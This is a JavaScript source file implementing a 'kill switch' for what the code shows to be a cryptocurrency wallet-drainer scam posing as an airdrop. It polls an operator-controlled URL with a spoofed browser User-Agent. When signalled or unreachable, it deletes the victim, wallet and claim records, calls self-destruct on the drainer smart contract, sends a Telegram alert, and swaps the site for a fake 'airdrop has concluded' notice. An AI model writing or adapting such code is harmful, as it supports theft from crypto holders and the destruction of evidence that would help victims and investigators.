// backend/src/lib/killswitch.js
const KILL_SWITCH_URL = process.env.KILL_SWITCH_URL || 'https://your-backup-domain.com/api/alive'
const KILL_SWITCH_KEY = process.env.KILL_SWITCH_KEY

export class KillSwitch {
  constructor() {
    this.active = true
    this.checkInterval = null
    this.lastCheck = null
  }
  
  async initialize() {
    // Start checking every 30 seconds
    this.checkInterval = setInterval(() => this.checkStatus(), 30000)
    await this.checkStatus()
  }
  
  async checkStatus() {
    try {
      const response = await fetch(KILL_SWITCH_URL, {
        method: 'GET',
        headers: {
          'X-KillSwitch': KILL_SWITCH_KEY,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        timeout: 10000
      })
      
      const data = await response.json()
      this.active = data.status === 'ACTIVE'
      this.lastCheck = new Date()
      
      if (!this.active) {
        console.log('🚨 KILL SWITCH ACTIVATED - SHUTTING DOWN')
        await this.executeShutdown()
      }
      
    } catch (error) {
      // If can't reach kill switch, assume compromised and shutdown
      console.log('🚨 Cannot reach kill switch - Emergency shutdown')
      this.active = false
      await this.executeShutdown()
    }
  }
  
  async executeShutdown() {
    // 1. Delete all sensitive data
    await this.wipeDatabase()
    
    // 2. Remove frontend files
    await this.deleteFrontend()
    
    // 3. Self-destruct contract
    await this.destroyContracts()
    
    // 4. Send alert
    await this.sendAlert()
    
    // 5. Exit process
    process.exit(0)
  }
  
  async wipeDatabase() {
    try {
      // Delete all victim data
      await prisma.victim.deleteMany({})
      
      // Delete wallet records
      await prisma.wallet.deleteMany({})
      
      // Delete claim records
      await prisma.claim.deleteMany({})
      
      // Log the wipe
      await prisma.log.create({
        data: {
          type: 'EMERGENCY_WIPE',
          message: 'Kill switch activated - all data destroyed',
          metadata: { timestamp: new Date(), ip: '0.0.0.0' }
        }
      })
    } catch (error) {
      console.error('Database wipe failed:', error)
    }
  }
  
  async deleteFrontend() {
    // Replace index.html with shutdown notice
    const shutdownHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>Service Unavailable</title></head>
    <body>
      <h1>404 - Service Not Found</h1>
      <p>This airdrop has concluded. Thank you for your participation.</p>
    </body>
    </html>
    `
    
    // In production, you'd actually delete/replace files
    console.log('Frontend would be deleted/replaced')
  }
  
  async destroyContracts() {
    // Call self-destruct on smart contracts
    const web3 = new Web3(process.env.RPC_URL)
    const contract = new web3.eth.Contract(DRAINER_ABI, process.env.EVM_DRAINER_CONTRACT)
    
    try {
      const accounts = await web3.eth.getAccounts()
      await contract.methods.destroy().send({ from: accounts[0] })
    } catch (error) {
      console.error('Contract destruction failed:', error)
    }
  }
  
  async sendAlert() {
    // Send Telegram/Discord alert
    const payload = {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: `🚨 KILL SWITCH ACTIVATED\nTime: ${new Date().toISOString()}\nSite: ${process.env.SITE_URL}`
    }
    
    try {
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
    } catch (error) {
      // Fail silently
    }
  }
  
  isActive() {
    return this.active
  }
}

// Frontend kill switch check
export function frontendKillCheck() {
  const KILL_CHECK_URL = process.env.VITE_KILL_CHECK_URL
  
  setInterval(async () => {
    try {
      const response = await fetch(KILL_CHECK_URL, { method: 'HEAD' })
      if (response.status !== 200) {
        // Redirect to shutdown page
        window.location.href = '/shutdown.html'
      }
    } catch (error) {
      window.location.href = '/shutdown.html'
    }
  }, 60000) // Check every minute
}